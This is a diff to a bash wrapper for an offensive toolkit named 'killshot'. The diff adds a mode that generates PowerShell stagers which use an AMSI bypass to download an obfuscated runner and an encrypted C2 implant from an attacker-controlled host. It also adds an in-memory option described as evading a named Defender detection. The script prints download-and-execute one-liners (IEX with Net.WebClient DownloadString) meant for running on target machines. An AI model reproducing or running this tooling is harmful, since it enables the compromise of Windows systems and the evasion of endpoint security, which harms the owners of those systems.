@@ -30,6 +30,7 @@ show_help() {
     echo "  COMMANDS"
     echo "    killshot generate [flags] [opts]  Generate specific components (or --all)"
     echo "    killshot tool <name> [opts]       Convert a single tool to shellcode"
+    echo "    killshot stager <name> [opts]     Generate PS1 stager for a tool"
     echo "    killshot list                     List available tools and status"
     echo "    killshot check                    Verify toolkit installation"
     echo "    killshot serve [port]             Start HTTP server for workspace"
@@ -44,6 +45,7 @@ show_help() {
     echo "    --implant              C2 implant shellcode (Sliver/MSF)"
     echo "    --runner               Polymorphic runner.exe"
     echo "    --stager               PowerShell stager with AMSI bypass"
+    echo "    --inline               Inline stager: no runner PE on disk (beats Bearfoos.A!ml)"
     echo "    --potato <name>        Single potato (GodPotato, PrintSpoofer, BadPotato, EfsPotato, SweetPotato)"
     echo "    --potatoes             All potato exploits"
     echo "    --tool <name>          Single tool to shellcode (see killshot list)"
@@ -67,6 +69,13 @@ show_help() {
     echo "  TOOL OPTIONS"
     echo "    killshot tool <name> [-p params] [-o output]"
     echo ""
+    echo "  STAGER OPTIONS"
+    echo "    killshot stager <name> [-l LHOST] [-p PORT] [--inline] [-o output.ps1]"
+    echo "      --inline    Full in-memory mode (no PE written to disk)"
+    echo "      -l IP       Attacker IP  (default: \$LHOST or 10.99.0.16)"
+    echo "      -p PORT     HTTP port    (default: 8000)"
+    echo "      -o PATH     Output path  (default: \$WORKSPACE/stager_<name>.ps1)"
+    echo ""
     echo "  EXAMPLES"
     echo "    killshot generate -l 10.10.14.5 --all            # Full pipeline"
     echo "    killshot generate -l 10.10.14.5 --runner         # Just runner.exe"
@@ -84,6 +93,9 @@ show_help() {
     echo "    killshot winpeas --no-donut                      # Obfuscate only, raw .exe"
     echo "    killshot winpeas -o /tmp/wp_obf.exe --no-donut   # Custom output path"
     echo "    killshot generate -l 10.10.14.5 -f msf --all     # Full pipeline (MSF)"
+    echo "    killshot stager rubeus -l 10.10.14.5             # Stager for Rubeus"
+    echo "    killshot stager sharpup -l 10.10.14.5 --inline  # In-memory SharpUp (no PE on disk)"
+    echo "    killshot stager godpotato -l 10.10.14.5         # Stager for GodPotato"
     echo "    killshot amsi                                    # Get AMSI bypass for session"
     echo "    killshot ps1 /workspace/killshot/script.ps1      # Encrypt PS1 for AMSI evasion"
     echo "    killshot list                                    # Show tools"
@@ -135,11 +147,14 @@ fi
 
 # Output directory: fixed location based on platform
 # Exegol: /workspace/killshot    Other: ~/killshot
+# Also checks ~/.exegol/workspaces/<active>/<dir>/killshot for host-side use
 if [ -n "$WORKSPACE" ]; then
     # WORKSPACE env override — use as-is
     true
 elif [ -d "/workspace" ]; then
     WORKSPACE="/workspace/killshot"
+elif _ew=$(find "$HOME/.exegol/workspaces" -maxdepth 2 -name "killshot" -type d 2>/dev/null | head -1) && [ -n "$_ew" ]; then
+    WORKSPACE="$_ew"
 else
     WORKSPACE="$HOME/killshot"
 fi
@@ -151,6 +166,8 @@ case "${1:-}" in
         MODE="generate"; shift;;
     tool)
         MODE="tool"; shift;;
+    stager)
+        MODE="stager"; shift;;
     list|ls)
         MODE="list"; shift;;
     all)
@@ -216,6 +233,43 @@ if [ "$MODE" = "tool" ]; then
     shift
     # Pass remaining args through to killshot.py
     exec python3 "$SCRIPT_DIR/killshot.py" --tool "$TOOL_NAME" -s "$SCRIPT_DIR" "$@"
+fi
+
+# ─── Mode: stager ─────────────────────────────────────────────
+
+if [ "$MODE" = "stager" ]; then
+    TOOL_NAME="${1:-}"
+    [ -n "$TOOL_NAME" ] && shift || true
+    STAGER_LHOST="${LHOST:-10.99.0.16}"
+    STAGER_PORT="${HTTP_PORT:-8000}"
+    STAGER_INLINE=""
+    STAGER_OUT=""
+    while [[ $# -gt 0 ]]; do
+        case "$1" in
+            --inline)          STAGER_INLINE="--inline"; shift;;
+            -l|--lhost)        STAGER_LHOST="$2"; shift 2;;
+            -p|--port|--http)  STAGER_PORT="$2"; shift 2;;
+            -o|--output)       STAGER_OUT="$2"; shift 2;;
+            *) shift;;
+        esac
+    done
+    # Prefer runner_c.dat (obfuscated PE blob) over plain runner.exe
+    if [ -f "$WORKSPACE/runner_c.dat" ]; then
+        RUNNER_FILE="runner_c.dat"
+    else
+        RUNNER_FILE="runner.exe"
+    fi
+    ENC_NAME="${TOOL_NAME:-implant}"
+    OUT="${STAGER_OUT:-$WORKSPACE/stager_${ENC_NAME}.ps1}"
+    cd "$SCRIPT_DIR"
+    python3 gen_stager.py \
+        --runner-url "http://$STAGER_LHOST:$STAGER_PORT/$RUNNER_FILE" \
+        --implant-url "http://$STAGER_LHOST:$STAGER_PORT/${ENC_NAME}.enc" \
+        --bypass 6 $STAGER_INLINE \
+        -o "$OUT"
+    echo "[+] Stager : $OUT"
+    echo "[+] Serve  : killshot serve $STAGER_PORT  (from $WORKSPACE)"
+    exit $?
 fi
 
 # ─── Mode: serve ──────────────────────────────────────────────
@@ -718,6 +772,7 @@ while [[ $# -gt 0 ]]; do
         --implant)      GEN_IMPLANT=1; shift;;
         --runner)       GEN_RUNNER=1; shift;;
         --stager)       GEN_STAGER=1; shift;;
+        --inline)       STAGER_INLINE=1; shift;;
         --potatoes)     GEN_POTATOES=1; shift;;
         --potato)       GEN_POTATOES=1; SINGLE_POTATO="$2"; shift 2;;
         --tools)        GEN_TOOLS=1; shift;;
@@ -907,10 +962,16 @@ if [ "$GEN_STAGER" = "1" ]; then
     cd "$SCRIPT_DIR"
     STAGER_OUT="${OUTPUT_OVERRIDE:-$WORKSPACE/stager.ps1}"
     [ "$GEN_ALL" = "1" ] && STAGER_OUT="$WORKSPACE/stager.ps1"
+    # Use C runner (runner_c.dat) if built, otherwise fall back to Go runner (runner.exe)
+    RUNNER_FILE="runner_c.dat"
+    [ ! -f "$WORKSPACE/runner_c.dat" ] && RUNNER_FILE="runner.exe"
+    INLINE_FLAG=""
+    [ "${STAGER_INLINE:-0}" = "1" ] && INLINE_FLAG="--inline"
     python3 gen_stager.py \
-        --runner-url "http://$LHOST:$HTTP_PORT/runner.exe" \
+        --runner-url "http://$LHOST:$HTTP_PORT/$RUNNER_FILE" \
         --implant-url "http://$LHOST:$HTTP_PORT/implant.enc" \
-        -o "$STAGER_OUT"
+        --bypass 6 \
+        -o "$STAGER_OUT" $INLINE_FLAG
     GENERATED+=("$(basename "$STAGER_OUT")")
 fi
 
@@ -1194,17 +1255,34 @@ echo "[*] Serve: cd $WORKSPACE && python3 -m http.server $HTTP_PORT"
 echo ""
 
 # Show on-target instructions per payload type
-HAS_MSI=0; HAS_RUNNER=0; HAS_STAGED=0; HAS_DLL=0; HAS_MSBUILD=0; HAS_INSTALLUTIL=0
+HAS_MSI=0; HAS_RUNNER=0; HAS_STAGED=0; HAS_DLL=0; HAS_MSBUILD=0; HAS_INSTALLUTIL=0; HAS_STAGER=0
 for f in "${GENERATED[@]}"; do
     case "$f" in
         update.msi)   HAS_MSI=1;;
-        runner.exe)   HAS_RUNNER=1;;
+        runner.exe|runner_c.dat) HAS_RUNNER=1;;
         beacon.bin)   HAS_STAGED=1;;
         update.dll)   HAS_DLL=1;;
         build.xml)    HAS_MSBUILD=1;;
         service.cs)   HAS_INSTALLUTIL=1;;
+        stager*.ps1)  HAS_STAGER=1;;
     esac
 done
+
+if [ "$HAS_STAGER" = "1" ]; then
+    STAGER_NAME=$(basename "${STAGER_OUT:-$WORKSPACE/stager.ps1}")
+    echo "┌─────────────────────────────────────────────────────────────────┐"
+    echo "│  ONE-LINER DELIVERY                                             │"
+    echo "├─────────────────────────────────────────────────────────────────┤"
+    echo "│  PS (WinRM/PS shell):                                           │"
+    echo "│    IEX(New-Object Net.WebClient).DownloadString('http://$LHOST:$HTTP_PORT/$STAGER_NAME')"
+    echo "│                                                                  │"
+    echo "│  CMD → PS (no -ep bypass: detected as PShellDlr.SA):           │"
+    echo "│    powershell -c \"IEX(New-Object Net.WebClient).DownloadString('http://$LHOST:$HTTP_PORT/$STAGER_NAME')\""
+    echo "│                                                                  │"
+    echo "│  TIP: Use --inline for zero PE-on-disk (beats Bearfoos.A!ml)   │"
+    echo "└─────────────────────────────────────────────────────────────────┘"
+    echo ""
+fi
 
 if [ "$HAS_MSI" = "1" ]; then
     echo "[*] MSI (AppLocker bypass via msiexec):"
